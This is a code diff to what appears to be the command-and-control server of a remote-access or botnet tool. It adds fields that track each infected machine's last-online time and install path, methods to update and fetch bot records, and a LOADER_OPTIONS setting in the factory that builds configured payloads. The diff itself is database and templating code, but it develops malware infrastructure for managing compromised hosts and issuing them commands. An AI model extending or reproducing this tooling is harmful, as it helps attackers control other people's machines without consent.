@@ -51,11 +51,12 @@ class Command:
 class Bot:
     """This class represents a bot."""
 
-    def __init__(self, bot_uid: str, username: str, hostname: str, last_seen: float):
+    def __init__(self, bot_uid: str, username: str, hostname: str, last_online: float, local_path: str):
         self.uid = bot_uid
         self.username = username
         self.hostname = hostname
-        self.last_seen = last_seen
+        self.last_online = last_online
+        self.local_path = local_path
 
 
 class Model:
@@ -77,7 +78,8 @@ class Model:
                              "bot_uid text PRIMARY KEY, "
                              "username text, "
                              "hostname text, "
-                             "last_seen real)")
+                             "last_online real, "
+                             "local_path text)")
         self._cursor.execute("CREATE TABLE commands("
                              "bot_uid text, "
                              "command text)")
@@ -91,9 +93,22 @@ class Model:
     def add_bot(self, bot: Bot):
         """Adds a bot to the database."""
         with self._lock:
-            self._cursor.execute("INSERT INTO bots VALUES(?,?,?,?)",
-                                 (bot.uid, bot.username, bot.hostname, bot.last_seen))
+            self._cursor.execute("INSERT INTO bots VALUES(?,?,?,?,?)",
+                                 (bot.uid, bot.username, bot.hostname, bot.last_online, bot.local_path))
             self._database.commit()
+
+    def update_bot(self, bot_uid: str, last_online: float, local_path: str):
+        """Updates the bot's last online time and local path."""
+        with self._lock:
+            self._cursor.execute("UPDATE bots SET last_online = ?, local_path = ? WHERE bot_uid = ?",
+                                 (last_online, local_path, bot_uid))
+        self._database.commit()
+
+    def get_bot(self, bot_uid: str) -> Bot:
+        """:return The bot object of the given UID."""
+        with self._lock:
+            response = self._cursor.execute("SELECT * FROM bots WHERE bot_uid = ? LIMIT 1", (bot_uid,)).fetchone()
+            return Bot(response[0], response[1], response[2], response[3], response[4])
 
     def remove_bot(self, bot_uid: str):
         """Removes the bot from the database."""
@@ -118,7 +133,7 @@ class Model:
             response = self._cursor.execute("SELECT * FROM bots LIMIT ? OFFSET ?", (limit, skip_amount))
 
             for row in response:
-                bots.append(Bot(row[0], row[1], row[2], row[3]))
+                bots.append(Bot(row[0], row[1], row[2], row[3], row[4]))
 
             return bots
 
@@ -214,6 +229,8 @@ class PayloadFactory:
                     configured_payload += "SERVER_PORT = {}\n".format(server_port)
                 elif line.startswith("PROGRAM_DIRECTORY = "):
                     configured_payload += "PROGRAM_DIRECTORY = os.path.expanduser(\"{}\")\n".format(program_directory)
+                elif line.startswith("LOADER_OPTIONS = "):
+                    configured_payload += "LOADER_OPTIONS = {}\n".format(str(loader_options))
                 else:
                     configured_payload += line
 
